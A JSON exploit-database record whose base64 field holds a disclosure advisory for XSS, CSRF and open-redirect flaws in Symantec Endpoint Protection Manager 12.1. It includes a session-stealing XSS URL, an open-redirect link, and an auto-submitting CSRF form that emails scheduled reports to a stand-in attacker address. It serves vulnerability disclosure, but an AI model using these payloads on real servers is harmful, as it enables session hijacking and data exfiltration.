{
    "source": "exploit-database", 
    "exploit": "WytdIENyZWRpdHM6IEpvaG4gUGFnZSBha2EgSFlQM1JMSU5YDQoNClsrXSBXZWJzaXRlOiBoeXAzcmxpbnguYWx0ZXJ2aXN0YS5vcmcNCg0KWytdIFNvdXJjZToNCmh0dHA6Ly9oeXAzcmxpbnguYWx0ZXJ2aXN0YS5vcmcvYWR2aXNvcmllcy9TWU1BTlRFQy1TRVBNLU1VTFRJUExFLVZVTE5TLnR4dA0KDQpbK10gSVNSOiBBcHBhcml0aW9uU2VjDQoNCg0KVmVuZG9yOg0KPT09PT09PT09PT09PT09PQ0Kd3d3LnN5bWFudGVjLmNvbQ0KDQoNClByb2R1Y3Q6DQo9PT09PT09PT09PQ0KU0VQTQ0KU3ltYW50ZWMgRW5kcG9pbnQgUHJvdGVjdGlvbiBNYW5hZ2VyIGFuZCBjbGllbnQgdjEyLjENCg0KU0VQTSBwcm92aWRlcyBhIGNlbnRyYWxseSBtYW5hZ2VkIHNvbHV0aW9uLiBJdCBoYW5kbGVzIHNlY3VyaXR5IHBvbGljeQ0KZW5mb3JjZW1lbnQsIGhvc3QgaW50ZWdyaXR5IGNoZWNraW5nIChTeW1hbnRlYyBOZXR3b3JrIEFjY2VzcyBDb250cm9sIG9ubHkpLA0KYW5kIGF1dG9tYXRlZCByZW1lZGlhdGlvbiBvdmVyIGFsbCBjbGllbnRzLiBUaGUgcG9saWNpZXMgZnVuY3Rpb25hbGl0eSBpcw0KdGhlIGhlYXJ0IG9mIHRoZSBTeW1hbnRlYyBzb2Z0d2FyZS4gQ2xpZW50cyBjb25uZWN0IHRvIHRoZSBzZXJ2ZXIgdG8gZ2V0IHRoZQ0KbGF0ZXN0IHBvbGljaWVzLCBzZWN1cml0eSBzZXR0aW5ncywgYW5kIHNvZnR3YXJlIHVwZGF0ZXMuDQoNCg0KVnVsbmVyYWJpbGl0eSBUeXBlKHMpOg0KPT09PT09PT09PT09PT09PT09PT09PQ0KTXVsdGlwbGUgQ3Jvc3MgU2l0ZSBTY3JpcHRpbmcgKFhTUykNCkNyb3NzIFNpdGUgUmVxdWVzdCBGb3JnZXJpZXMgKENTUkYpDQpPcGVuIFJlZGlyZWN0DQoNCg0KQ1ZFIFJlZmVyZW5jZShzKToNCj09PT09PT09PT09PT09PT09DQpDVkUtMjAxNi0zNjUyIC8gWFNTDQpDVkUtMjAxNi0zNjUzIC8gQ1NSRg0KQ1ZFLTIwMTYtNTMwNCAvIE9wZW4gUmVkaXJlY3QNCg0KDQpWdWxuZXJhYmlsaXR5IERldGFpbHM6DQo9PT09PT09PT09PT09PT09PT09PT0NCg0KVGhlIG1hbmFnZW1lbnQgY29uc29sZSBmb3IgU0VQTSBjb250YWlucyBhIG51bWJlciBvZiBzZWN1cml0eQ0KdnVsbmVyYWJpbGl0aWVzIHRoYXQgY291bGQgYmUgdXNlZCBieSBhIGxvd2VyLXByaXZpbGVnZWQgdXNlciBvciBieQ0KYW4gdW5hdXRob3JpemVkIHVzZXIgdG8gZWxldmF0ZSBwcml2aWxlZ2Ugb3IgZ2FpbiBhY2Nlc3MgdG8gdW5hdXRob3JpemVkDQppbmZvcm1hdGlvbiBvbiB0aGUgbWFuYWdlbWVudCBzZXJ2ZXIuIEV4cGxvaXRhdGlvbiBhdHRlbXB0cyBvZg0KdGhlc2UgdnVsbmVyYWJpbGl0aWVzIHJlcXVpcmVzIGFjY2VzcyB0byB0aGUgU0VQIE1hbmFnZW1lbnQgY29uc29sZS4NCg0KDQpSZWZlcmVuY2VzOg0KPT09PT09PT09PT09DQpodHRwczovL3d3dy5zeW1hbnRlYy5jb20vc2VjdXJpdHlfcmVzcG9uc2Uvc2VjdXJpdHl1cGRhdGVzL2RldGFpbC5qc3A/ZmlkPXNlY3VyaXR5X2Fkdmlzb3J5JnB2aWQ9c2VjdXJpdHlfYWR2aXNvcnkmeWVhcj0mc3VpZD0yMDE2MDYyOF8wMQ0KDQoNCkV4cGxvaXQgY29kZShzKToNCj09PT09PT09PT09PT09PQ0KDQpJbiB0aGlzIGNhc2UgWFNTIGNhbiBieXBhc3MgdGhlICJodHRwLW9ubHkiIGNvb2tpZSBwcm90ZWN0aW9uIGJlY2F1c2UgdGhlDQpTRVBNIGFwcGxpY2F0aW9uIHdyaXRlcyBhbmQgc3RvcmVzIHRoZSBzZXNzaW9uIElEIHdpdGhpbiB2YXJpb3VzDQpqYXZhc2NyaXB0IGZ1bmN0aW9ucyB1c2VkIGJ5IHRoZSBhcHBsaWNhdGlvbiB3aXRoaW4gdGhlIERPTSB0aGVyZWJ5DQpleHBvc2luZyB0aGVtIGRpcmVjdGx5IHRvIHRoZSBYU1MgYXR0YWNrLg0KDQoxKSBjcmVhdGVNb2RhbERpYWxvZ0Zyb21VUkwNCjIpIGNyZWF0ZVdpbmRvd0Zyb21VUkwNCjMpIGNyZWF0ZVdpbmRvd0Zyb21Gb3JtDQo0KSBjcmVhdGVJRVdpbmRvd0Zyb21Gb3JtDQoNClNvIGFsbCB3ZSBuZWVkIHRvIGRvIGlzIGFsZXJ0KGNyZWF0ZU1vZGFsRGlhbG9nRnJvbVVSTCkgYW55b25lIG9uZSBvZiB0aGVtDQooZnVuY3Rpb25zKSBhbiBpdCB3aWxsIGxlYWsgdGhlIHNlc3Npb24gSUQgZXNzZW50aWFsbHkgdGhyb3dpbmcgdGhlDQpIdHRwT25seSBzZWN1cmUgY29va2llIHByb3RlY3Rpb24gZmxhZyBpbnRvIHRoZSBnYXJiYWdlLg0KDQplLmcuDQoNClhTUyBQT0MgRGVmZWF0IGh0dHAtb25seSBmbGFnIGFuZCBhY2Nlc3MgUEhQU0VTU0lEOg0KDQpodHRwczovL2xvY2FsaG9zdDo4NDQ1L1JlcG9ydGluZy9BZG1pbi9ub3RpZmljYXRpb25wb3B1cC5waHA/TmV3PTEmVHlwZT1DUiZoZWlnaHQ9YWxlcnQlMjhjcmVhdGVNb2RhbERpYWxvZ0Zyb21VUkwlMjkjDQoNCg0KDQpPcGVuIFJlZGlyZWN0IGluIGV4dGVybmFsIFVSTCAucGhwIHNjcmlwdDoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCkEgcmVwb3J0aW5nIFVSTCB1c2VkIHRvIHJvdXRlIGdlbmVyYXRlZCByZXBvcnRzIGV4dGVybmFsbHkgdG8gYW55DQphdXRob3JpemVkIFVSTCBpcyBzdXNjZXB0aWJsZSB0byBhbiBvcGVuIHJlZGlyZWN0IHZ1bG5lcmFiaWxpdHkNCnRoYXQgY291bGQgaGF2ZSBhbGxvd2VkIGFuIGF1dGhvcml6ZWQgYnV0IGxlc3MtcHJpdmlsZWdlZCB1c2VyIHRvIHJlZGlyZWN0DQphbiB1bnN1c3BlY3RpbmcgcHJpdmlsZWdlZCB1c2VyIHRvIGFuIGV4dGVybmFsIFVSTCB0bw0KYXR0ZW1wdCBmdXJ0aGVyIGV4cGxvaXRhdGlvbiwgZS5nLiBwaGlzaGluZy4NCg0KDQpJZiBhIHZpY3RpbSBjbGlja3Mgb24gYSBsaW5rIHN1cHBsaWVkIGJ5IGFuIGF0dGFja2VyDQoNCmUuZy4NCg0KaHR0cHM6Ly9sb2NhbGhvc3Q6ODQ0NS9SZXBvcnRpbmcvY29tbW9uL2V4dGVybmFsdXJsLnBocD91cmw9aHR0cDovL2h5cDNybGlueC5hbHRlcnZpc3RhLm9yZw0KDQoNCg0KQ3Jvc3MgU2l0ZSBSZXF1ZXN0IEZvcmdlcnkgKENTUkYpOg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQpNdWx0aXBsZSBDcm9zcyBTaXRlIFJlcXVlc3QgRm9yZ2VyeSBleGlzdHMgaW4gY291cGxlIG9mIHBsYWNlcyB3aXRoaW4gdGhpcw0KdmVyc2lvbiBvZiBTRVBNIGJlbG93IGlzIGFuIGV4YW1wbGUgb2Ygc2VuZGluZyBzY2hlZHVsZWQgcmVwb3J0IHRvDQphbiByZW1vdGUgYXR0YWNrZXJzIGVtYWlsLCBpZiBjdXJyZW50IGxvZ2dlZCBpbiB1c2VyIHZpc2l0cyBtYWxpY2lvdXMNCndlYnBhZ2Ugb3IgY2xpY2tzIGluZmVjdGVkIGxpbmsgZXRjLi4uDQoNCg0KU3ltYW50ZWMgUmVwb3J0aW5nIEFkbWluIENTUkYgUE9DOg0KDQo8Zm9ybSBpZD0iUFdOIiBhY3Rpb249Imh0dHBzOi8vbG9jYWxob3N0Ojg0NDUvUmVwb3J0aW5nL1JlcG9ydHMvc3Itc2F2ZS5waHAiDQptZXRob2Q9IlBPU1QiIC8+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJSZXBvcnROYW1lIiB2YWx1ZT0iSEVMTCIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IkRlc2NyaXB0aW9uIiB2YWx1ZT0iUFdORUQhIiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iRGlzYWJsZVJlcG9ydFNjaGVkdWxlIiB2YWx1ZT0ib24iIC8+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJOZXdSZXBvcnQiIHZhbHVlPSJZIiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icmVwb3J0dHlwZSIgdmFsdWU9IjEiIC8+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJGSUxURVJOQU1FIiB2YWx1ZT0iRGVmYXVsdCIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJ1bkV2ZXJ5IiB2YWx1ZT0iMSIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJlcGVhdCIgdmFsdWU9IndlZWtseSIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRhdGVzY2hlZDEiIHZhbHVlPSIwMiUyRjEwJTJGMjAxNiIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRhdGVzY2hlZDIiIHZhbHVlPSIwMiUyRjEwJTJGMjAxNiIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbEhvdXJTY2hlZHVsZSIgdmFsdWU9IjE2IiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU2NoZWR1bGVob3VyIiB2YWx1ZT0iMTYiIC8+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxNaW5TY2hlZHVsZSIgdmFsdWU9IjU2IiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iU2NoZWR1bGVtaW51dGUiIHZhbHVlPSI1NiIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InN5c2FkbWluIiB2YWx1ZT0ib2ZmIiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic2VuZHRvIiB2YWx1ZT0iZXZpbEBhYnlzcy5jb20iIC8+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1cGRhdGVsYXN0cnVuIiB2YWx1ZT0iMCIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9IkhJU1RPUllDT05GSUdfSURYIiB2YWx1ZT0iIiAvPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iUmVwb3J0UHJlZml4IiB2YWx1ZT0iWSIgLz4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJlcG9ydF9pZHgiIHZhbHVlPSJZLTAiIC8+DQo8c2NyaXB0PmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdQV04nKS5zdWJtaXQoKTwvc2NyaXB0Pg0KPC9mb3JtPg0KDQoNCkRpc2Nsb3N1cmUgVGltZWxpbmU6DQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KVmVuZG9yIE5vdGlmaWNhdGlvbjogRmVidWFyeSAxMSwgMjAxNg0KVmVuZG9yIEFja25vd2xlZGdlcyBSZXBvcnQ6IEZlYnVhcnkgMTIsIDIwMTYNClZlbmRvciBSZWxlYXNlcyBGaXg6IEp1bmUgMjgsIDIwMTYNCkp1bmUgMjksIDIwMTYgOiBQdWJsaWMgRGlzY2xvc3VyZQ0KDQoNCkV4cGxvaXRhdGlvbiBUZWNobmlxdWU6DQo9PT09PT09PT09PT09PT09PT09PT09PQ0KUmVtb3RlDQoNCg0KU2V2ZXJpdHkgTGV2ZWwocyk6DQo9PT09PT09PT09PT09PT09PT09PQ0KQ3Jvc3MgU2l0ZSBTY3JpcHRpbmcNCk1lZGl1bQ0KdjIgNi44DQpBVjpBL0FDOk0vQXU6Uy9DOkMvSTpDL0E6Tg0KdjMgNi43DQpBVjpBL0FDOkwvUFI6TC9VSTpSL1M6VS9DOkgvSTpIL0E6Tg0KDQpDcm9zcyBTaXRlIFJlcXVlc3QgRm9yZ2VyeQ0KSGlnaA0KdjIgNy4wDQpBVjpBL0FDOk0vQXU6TS9DOkMvSTpDL0E6Qw0KdjMgNy4xDQpBVjpBL0FDOkgvUFI6TC9VSTpOL1M6VS9DOkgvSTpIL0E6SA0KDQpPcGVuIFJlZGlyZWN0DQpNZWRpdW0NCnYyIDQuMQ0KQVY6QS9BQzpML0F1OlMvQzpQL0k6UC9BOk4NCnYzIDQuMQ0KQVY6QS9BQzpML1BSOkwvVUk6Ui9TOlUvQzpML0k6TC9BOk4NCg0KDQpbK10gRGlzY2xhaW1lcg0KVGhlIGluZm9ybWF0aW9uIGNvbnRhaW5lZCB3aXRoaW4gdGhpcyBhZHZpc29yeSBpcyBzdXBwbGllZCAiYXMtaXMiIHdpdGggbm8NCndhcnJhbnRpZXMgb3IgZ3VhcmFudGVlcyBvZiBmaXRuZXNzIG9mIHVzZSBvciBvdGhlcndpc2UuDQpQZXJtaXNzaW9uIGlzIGhlcmVieSBncmFudGVkIGZvciB0aGUgcmVkaXN0cmlidXRpb24gb2YgdGhpcyBhZHZpc29yeSwNCnByb3ZpZGVkIHRoYXQgaXQgaXMgbm90IGFsdGVyZWQgZXhjZXB0IGJ5IHJlZm9ybWF0dGluZyBpdCwgYW5kDQp0aGF0IGR1ZSBjcmVkaXQgaXMgZ2l2ZW4uIFBlcm1pc3Npb24gaXMgZXhwbGljaXRseSBnaXZlbiBmb3IgaW5zZXJ0aW9uIGluDQp2dWxuZXJhYmlsaXR5IGRhdGFiYXNlcyBhbmQgc2ltaWxhciwgcHJvdmlkZWQgdGhhdCBkdWUgY3JlZGl0DQppcyBnaXZlbiB0byB0aGUgYXV0aG9yLiBUaGUgYXV0aG9yIGlzIG5vdCByZXNwb25zaWJsZSBmb3IgYW55IG1pc3VzZSBvZiB0aGUNCmluZm9ybWF0aW9uIGNvbnRhaW5lZCBoZXJlaW4gYW5kIGFjY2VwdHMgbm8gcmVzcG9uc2liaWxpdHkNCmZvciBhbnkgZGFtYWdlIGNhdXNlZCBieSB0aGUgdXNlIG9yIG1pc3VzZSBvZiB0aGlzIGluZm9ybWF0aW9uLiBUaGUgYXV0aG9yDQpwcm9oaWJpdHMgYW55IG1hbGljaW91cyB1c2Ugb2Ygc2VjdXJpdHkgcmVsYXRlZCBpbmZvcm1hdGlvbg0Kb3IgZXhwbG9pdHMgYnkgdGhlIGF1dGhvciBvciBlbHNld2hlcmUuDQoNCmh5cDNybGlueA==", 
    "filename": "platforms/php/webapps/40041.txt", 
    "id": "40041", 
    "cves": [
        "CVE-2016-3652", 
        "CVE-2016-3653", 
        "CVE-2016-5304"
    ]
}